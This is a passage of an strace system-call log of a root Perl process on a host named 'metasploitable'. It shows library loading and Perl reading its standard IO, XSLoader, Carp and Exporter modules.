512
7464  07:18:53.227635 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
7464  07:18:53.227652 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7deb000
7464  07:18:53.227662 mmap2(0xb7f34000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f34000
7464  07:18:53.227676 mmap2(0xb7f37000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f37000
7464  07:18:53.227688 close(1)          = 0
7464  07:18:53.227700 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7464  07:18:53.227713 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
7464  07:18:53.227726 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
7464  07:18:53.227813 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
7464  07:18:53.227829 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7db9000
7464  07:18:53.227840 mmap2(0xb7dc2000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7dc2000
7464  07:18:53.227854 mmap2(0xb7dc4000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7dc4000
7464  07:18:53.227880 close(1)          = 0
7464  07:18:53.227931 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7db8000
7464  07:18:53.227945 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7db88c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
7464  07:18:53.228018 mprotect(0xb7f34000, 4096, PROT_READ) = 0
7464  07:18:53.228044 munmap(0xb7f7c000, 29913) = 0
7464  07:18:53.228056 set_tid_address(0xb7db8908) = 7464
7464  07:18:53.228065 set_robust_list(0xb7db8910, 0xc) = 0
7464  07:18:53.228074 futex(0xbfa6d710, 0x81 /* FUTEX_??? */, 1) = 0
7464  07:18:53.228088 rt_sigaction(SIGRTMIN, {0xb7f3e2c0, [], SA_SIGINFO}, NULL, 8) = 0
7464  07:18:53.228101 rt_sigaction(SIGRT_1, {0xb7f3e340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
7464  07:18:53.228113 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
7464  07:18:53.228126 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
7464  07:18:53.228145 uname({sys="Linux", node="metasploitable", ...}) = 0
7464  07:18:53.228189 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
7464  07:18:53.228234 brk(0)            = 0x8153000
7464  07:18:53.228244 brk(0x8174000)    = 0x8174000
7464  07:18:53.228287 getuid32()        = 0
7464  07:18:53.228296 geteuid32()       = 0
7464  07:18:53.228305 getgid32()        = 0
7464  07:18:53.228314 getegid32()       = 0
7464  07:18:53.228349 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d97000
7464  07:18:53.228390 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
7464  07:18:53.228411 read(1, "\243\335\221g", 4) = 4
7464  07:18:53.228424 close(1)          = 0
7464  07:18:53.228442 time(NULL)        = 1495624733
7464  07:18:53.228482 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbfa6d3e0) = -1 ENOENT (No such file or directory)
7464  07:18:53.228499 stat64("/usr/local/lib/site_perl/5.8.8", 0xbfa6d3e0) = -1 ENOENT (No such file or directory)
7464  07:18:53.228512 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbfa6d3e0) = -1 ENOENT (No such file or directory)
7464  07:18:53.228527 stat64("/usr/local/lib/perl/5.8.7", 0xbfa6d520) = -1 ENOENT (No such file or directory)
7464  07:18:53.228539 stat64("/usr/local/share/perl/5.8.7", 0xbfa6d520) = -1 ENOENT (No such file or directory)
7464  07:18:53.228551 stat64("/usr/local/lib/perl/5.8.6", 0xbfa6d520) = -1 ENOENT (No such file or directory)
7464  07:18:53.228563 stat64("/usr/local/share/perl/5.8.6", 0xbfa6d520) = -1 ENOENT (No such file or directory)
7464  07:18:53.228575 stat64("/usr/local/lib/perl/5.8.4", 0xbfa6d520) = -1 ENOENT (No such file or directory)
7464  07:18:53.228586 stat64("/usr/local/share/perl/5.8.4", 0xbfa6d520) = -1 ENOENT (No such file or directory)
7464  07:18:53.228597 stat64("/usr/local/lib/perl/5.8.3", 0xbfa6d520) = -1 ENOENT (No such file or directory)
7464  07:18:53.228608 stat64("/usr/local/share/perl/5.8.3", 0xbfa6d520) = -1 ENOENT (No such file or directory)
7464  07:18:53.228620 stat64("/usr/local/lib/perl/5.8.2", 0xbfa6d520) = -1 ENOENT (No such file or directory)
7464  07:18:53.228631 stat64("/usr/local/share/perl/5.8.2", 0xbfa6d520) = -1 ENOENT (No such file or directory)
7464  07:18:53.228643 stat64("/usr/local/lib/perl/5.8.1", 0xbfa6d520) = -1 ENOENT (No such file or directory)
7464  07:18:53.228654 stat64("/usr/local/share/perl/5.8.1", 0xbfa6d520) = -1 ENOENT (No such file or directory)
7464  07:18:53.228665 stat64("/usr/local/lib/perl/5.8.0", 0xbfa6d520) = -1 ENOENT (No such file or directory)
7464  07:18:53.228677 stat64("/usr/local/share/perl/5.8.0", 0xbfa6d520) = -1 ENOENT (No such file or directory)
7464  07:18:53.228699 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6d218) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.228711 _llseek(0, 0, [0], SEEK_CUR) = 0
7464  07:18:53.228723 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6d218) = -1 EBADF (Bad file descriptor)
7464  07:18:53.228733 _llseek(1, 0, 0xbfa6d260, SEEK_CUR) = -1 EBADF (Bad file descriptor)
7464  07:18:53.228750 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6d218) = -1 EINVAL (Invalid argument)
7464  07:18:53.228761 _llseek(2, 0, 0xbfa6d260, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7464  07:18:53.228771 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
7464  07:18:53.228784 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6d2d8) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.228794 _llseek(1, 0, [0], SEEK_CUR) = 0
7464  07:18:53.228819 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
7464  07:18:53.228860 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
7464  07:18:53.228880 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
7464  07:18:53.228965 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
7464  07:18:53.229007 getppid()         = 7462
7464  07:18:53.229066 stat64("/etc/perl/IO.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.229080 stat64("/etc/perl/IO.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.229093 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.229106 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.229119 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.229131 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.229144 stat64("/usr/lib/perl5/IO.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.229156 stat64("/usr/lib/perl5/IO.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.229188 stat64("/usr/share/perl5/IO.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.229201 stat64("/usr/share/perl5/IO.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.229214 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.229262 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
7464  07:18:53.229310 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
7464  07:18:53.229364 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6cce8) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.229391 _llseek(6, 0, [0], SEEK_CUR) = 0
7464  07:18:53.229430 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
7464  07:18:53.229500 stat64("/etc/perl/XSLoader.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.229513 stat64("/etc/perl/XSLoader.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.229526 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.229539 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.229553 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.229565 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.229579 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.229590 stat64("/usr/lib/perl5/XSLoader.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.229603 stat64("/usr/share/perl5/XSLoader.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.229615 stat64("/usr/share/perl5/XSLoader.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.229628 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.229645 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
7464  07:18:53.229665 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
7464  07:18:53.229678 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6c838) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.229689 _llseek(8, 0, [0], SEEK_CUR) = 0
7464  07:18:53.229706 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
7464  07:18:53.229991 brk(0x8195000)    = 0x8195000
7464  07:18:53.230306 _llseek(8, 3407, [3407], SEEK_SET) = 0
7464  07:18:53.237018 _llseek(8, 0, [3407], SEEK_CUR) = 0
7464  07:18:53.237047 close(8)          = 0
7464  07:18:53.237095 stat64("/etc/perl/Carp.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.237110 stat64("/etc/perl/Carp.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.237123 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.237136 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.237150 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.237162 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.237175 stat64("/usr/lib/perl5/Carp.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.237186 stat64("/usr/lib/perl5/Carp.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.237199 stat64("/usr/share/perl5/Carp.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.237211 stat64("/usr/share/perl5/Carp.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.237224 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.237236 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.237249 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.237262 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
7464  07:18:53.237282 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
7464  07:18:53.237296 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6c838) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.237308 _llseek(8, 0, [0], SEEK_CUR) = 0
7464  07:18:53.237325 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
7464  07:18:53.237822 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
7464  07:18:53.237849 read(8, "", 4096) = 0
7464  07:18:53.237861 close(8)          = 0
7464  07:18:53.237883 stat64("/etc/perl/Exporter.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.237896 stat64("/etc/perl/Exporter.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.237910 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.237922 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.237936 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.237948 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.237976 stat64("/usr/lib/perl5/Exporter.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.238015 stat64("/usr/lib/perl5/Exporter.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.238029 stat64("/usr/share/perl5/Exporter.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.238074 stat64("/usr/share/perl5/Exporter.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.238087 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.238099 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.238113 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.238125 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
7464  07:18:53.238146 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
7464  07:18:53.238160 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6c838) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.238175 _llseek(8, 0, [0], SEEK_CUR) = 0
7464  07:18:53.238192 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
7464  07:18:53.238581 _llseek(8, 2217, [2217], SEEK_SET) = 0
7464  07:18:53.238598 _llseek(8, 0, [2217], SEEK_CUR) = 0
7464  07:18:53.238609 close(8)          = 0
7464  07:18:53.238682 stat64("/etc/perl/strict.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.238698 stat64("/etc/perl/strict.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.238711 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.238724 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.238737 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.238750 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.238764 stat64("/usr/lib/perl5/strict.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.238775 stat64("/usr/lib/perl5/strict.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.238788 stat64("/usr/share/perl5/strict.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
